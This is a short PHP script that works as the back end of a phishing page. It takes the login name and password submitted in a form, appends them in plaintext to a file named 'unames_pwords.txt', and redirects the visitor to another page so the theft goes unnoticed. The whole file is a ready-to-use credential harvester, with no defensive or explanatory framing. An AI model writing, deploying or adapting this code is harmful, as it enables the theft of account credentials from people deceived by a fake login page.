<?php
  $log_file_name = 'unames_pwords.txt';
  $n = $_POST['name'];
	$p = $_POST['pass'];
 	 $message = "Login name : ".$n."\t" . "password : ".$p."\n";
 	 file_put_contents($log_file_name, $message, FILE_APPEND);
  header('Location: /haha.html'); // redirect back to the main site
?>
